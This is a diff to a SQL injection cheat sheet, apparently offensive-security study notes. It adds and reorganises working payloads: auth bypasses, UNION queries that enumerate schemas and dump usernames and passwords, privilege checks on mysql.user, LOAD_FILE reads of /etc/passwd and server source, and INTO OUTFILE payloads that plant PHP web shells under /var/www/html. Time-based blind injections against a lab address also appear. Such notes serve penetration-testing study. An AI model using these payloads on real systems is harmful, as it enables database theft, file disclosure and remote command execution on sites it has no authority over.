@@ -404,10 +404,6 @@ SELECT * FROM logins WHERE username LIKE 'admin%';
 # this will match with three characters
 SELECT * FROM logins WHERE username like '___';
 
-# INFORMATION_SCHEMA
-## The SCHEMA_NAME column contains all the database names currently present.
-SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
-
 # URL encoded
 '	%27
 "	%22
@@ -415,24 +411,15 @@ SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
 ;	%3B
 )	%29
 
-# MySQL Fingerprinting
-SELECT @@version
-: When we have full query output	MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1'
-In MSSQL it returns MSSQL version. Error with other DBMS.
-
-SELECT POW(1,1)	When we only have numeric output	1	Error with other DBMS
-
-SELECT SLEEP(5)	Blind/No Output	Delays page response for 5 seconds and returns 0.	Will not delay response with other DBMS
-
-
 # Auth Bypass with OR operator
 admin' or '1'='1
 something' or '1'='1
 
 # Auth Bypass with comments
+admin' --
 admin')--
 
-#Error-based Payloads
+# Error-based Payloads
 offsec' OR 1=1 -- //
 ' or 1=1 in (select @@version) -- //
 ' OR 1=1 in (SELECT * FROM users) -- //
@@ -444,15 +431,62 @@ offsec' OR 1=1 -- //
 %' UNION SELECT database(), user(), @@version, null, null -- //
 ' UNION SELECT null, null, database(), user(), @@version  -- //
 
-
-# UNION-based using INFORMATION_SCHEMA database
-' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
-' UNION SELECT null, username, password, description, null FROM users -- //
+# INFORMATION_SCHEMA
+## SCHEMATA table in the INFORMATION_SCHEMA database contains information about all databases
+## The SCHEMA_NAME column contains all the database names currently present.
+## UNION SQL injection to get all the databases names
 cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+
+## Find the current database
 cn' UNION select 1,database(),2,3-- -
+
+## TABLES table contains information about all tables throughout the database
+## TABLE_NAME column stores table names, while the TABLE_SCHEMA column points to the database each table belongs to
 cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
+
+## COLUMNS table contains information about all columns present in all the databases.
+## COLUMN_NAME, TABLE_NAME, and TABLE_SCHEMA columns can be used to achieve this
 cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
+
+## UNION-based using INFORMATION_SCHEMA database to get current database's table, column, database name
+' union select null, table_name, column_name, table_schema from information_schema.columns where table_schema=database() -- //
+' UNION SELECT null, username, password, description, null FROM users -- //
+
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+
+
+# User && Privileges
+## DB User
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+
+## UNION injection to read user info
+cn' UNION SELECT 1, user(), 3, 4-- -
+cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
+
+## User Privileges(check if we have super_user privilege && FILE privilege..)
+SELECT super_priv FROM mysql.user
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
+
+## LOAD FILE
+SELECT LOAD_FILE('/etc/passwd');
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+
+# FILE WRITE PRIV
+- User with FILE privilege enabled
+- MySQL global secure_file_priv variable not enabled
+- Write access to the location we want to write to on the back-end server
+
+# Check if we have file write privilege
+SHOW VARIABLES LIKE 'secure_file_priv';
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+
+# php webshell using file write privilege
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 
 
 # Blind SQL Injections
@@ -461,6 +495,14 @@ http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
 #time-based SQLi
 http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
 
+# MySQL Fingerprinting
+SELECT @@version
+: When we have full query output	MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1'
+In MSSQL it returns MSSQL version. Error with other DBMS.
+
+SELECT POW(1,1)	When we only have numeric output	1	Error with other DBMS
+
+SELECT SLEEP(5)	Blind/No Output	Delays page response for 5 seconds and returns 0.	Will not delay response with other DBMS
 ```
 
 ## sqlite
